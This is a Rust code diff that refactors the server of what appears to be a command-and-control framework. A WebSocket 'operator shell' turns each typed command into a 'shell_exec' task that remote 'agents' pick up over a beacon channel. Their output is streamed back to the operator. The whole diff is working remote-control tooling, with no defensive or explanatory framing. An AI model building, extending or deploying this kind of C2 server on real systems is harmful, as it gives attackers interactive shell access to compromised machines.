@@ -19,21 +19,46 @@ pub struct SessionInfo {
     pub alive: bool,
 }
 
-type RelayMap = Arc<Mutex<HashMap<String, mpsc::Sender<String>>>>;
+/// Shared registry of live operator WebSocket senders, keyed by session id.
+///
+/// This lives on `AppState` so any handler (beacon ingest, collect, admin)
+/// can stream text back to the operator session that is watching a given
+/// agent. A per-connection map (the previous design) could only echo the
+/// operator's own input back to itself.
+pub type RelayMap = Arc<Mutex<HashMap<String, mpsc::Sender<String>>>>;
 
+/// Send a line of agent output to the operator session, if one is attached.
+pub async fn relay_to_session(state: &AppState, session_id: &str, line: String) {
+    let map = state.relay.lock().await;
+    if let Some(tx) = map.get(session_id) {
+        let _ = tx.send(line).await;
+    }
+}
+
+/// Operator interactive shell over WebSocket.
+///
+/// Protocol:
+/// 1. Operator connects to `GET /shell/:session_id` (WebSocket upgrade).
+/// 2. First text frame must be a JSON object: `{"agent_id": "..."}`.
+/// 3. Every following text frame is a shell command for that agent. The
+///    server queues it as a task (`GET /task/:agent_id` is the pickup
+///    point) and acknowledges the queueing over the same WebSocket.
+/// 4. When an agent posts results (beacon frame with `session` + `output`
+///    fields), they are streamed to the attached operator session.
 pub async fn handle_shell(ws: WebSocket, state: AppState, session_id: String) {
     let (ws_sender, mut ws_receiver) = ws.split();
-    let relay_map: RelayMap = Arc::new(Mutex::new(HashMap::new()));
 
+    // ── Handshake: operator tells us which agent it wants a shell on ──
     let agent_id = match ws_receiver.next().await {
         Some(Ok(Message::Text(text))) => {
             let ident: serde_json::Value = serde_json::from_str(&text).unwrap_or_default();
             let agent = ident
                 .get("agent_id")
                 .and_then(|v| v.as_str())
-                .unwrap_or("unknown");
-            info!(agent = %agent, session = %session_id, "Operator connected");
-            agent.to_string()
+                .unwrap_or("unknown")
+                .to_string();
+            info!(agent = %agent, session = %session_id, "Operator shell attached");
+            agent
         }
         _ => {
             warn!(session = %session_id, "Session closed without identification");
@@ -46,22 +71,17 @@ pub async fn handle_shell(ws: WebSocket, state: AppState, session_id: String) {
         sessions.register(&session_id, &agent_id);
     }
 
-    let (output_tx, mut output_rx) = mpsc::channel::<String>(256);
+    // out_tx: anything sent here is streamed to the operator's WebSocket.
+    let (out_tx, mut out_rx) = mpsc::channel::<String>(256);
+    state.relay.lock().await.insert(session_id.clone(), out_tx);
 
-    {
-        let mut map = relay_map.lock().await;
-        map.insert(session_id.clone(), output_tx);
-    }
-
-    let relay_map_clone = relay_map.clone();
-    let session_id_clone = session_id.clone();
-
+    // ── Outbound: relayed agent output + pings → operator ──
     let ws_send_task = tokio::spawn(async move {
         let mut ws_sender: SplitSink<WebSocket, Message> = ws_sender;
         loop {
             tokio::select! {
-                Some(msg) = output_rx.recv() => {
-                    if ws_sender.send(Message::Text(msg.into())).await.is_err() {
+                Some(msg) = out_rx.recv() => {
+                    if ws_sender.send(Message::Text(msg)).await.is_err() {
                         break;
                     }
                 }
@@ -74,15 +94,31 @@ pub async fn handle_shell(ws: WebSocket, state: AppState, session_id: String) {
         }
     });
 
+    // ── Inbound: operator commands → queued as real tasks for the agent ──
+    let relay_map = state.relay.clone();
+    let db = state.db.clone();
+    let agent_for_tasks = agent_id.clone();
+    let session_for_tasks = session_id.clone();
     let ws_recv_task = tokio::spawn(async move {
+        let mut seq: u64 = 0;
         loop {
             match ws_receiver.next().await {
                 Some(Ok(Message::Text(text))) => {
-                    // Forward to agent if there's a connection
-                    let map = relay_map_clone.lock().await;
-                    if let Some(tx) = map.get(&session_id_clone) {
-                        let _ = tx.send(text).await;
+                    seq += 1;
+                    let task_id = format!("sh-{}-{}", session_for_tasks, seq);
+                    let payload = serde_json::json!({
+                        "cmd": text,
+                        "session": session_for_tasks,
+                    });
+                    {
+                        let db = db.lock().await;
+                        db.push_task(&agent_for_tasks, &task_id, "shell_exec", &payload);
                     }
+                    // Acknowledge over the same socket (out map send).
+                    if let Some(tx) = relay_map.lock().await.get(&session_for_tasks) {
+                        let _ = tx.send(format!("[queued {task_id}] {text}")).await;
+                    }
+                    info!(agent = %agent_for_tasks, task = %task_id, "Shell command queued");
                 }
                 Some(Ok(Message::Close(_))) | None => break,
                 _ => {}
@@ -95,11 +131,7 @@ pub async fn handle_shell(ws: WebSocket, state: AppState, session_id: String) {
         _ = ws_recv_task => {},
     }
 
-    {
-        let mut map = relay_map.lock().await;
-        map.remove(&session_id);
-    }
-
+    state.relay.lock().await.remove(&session_id);
     {
         let mut sessions = state.sessions.lock().await;
         sessions.unregister(&session_id);
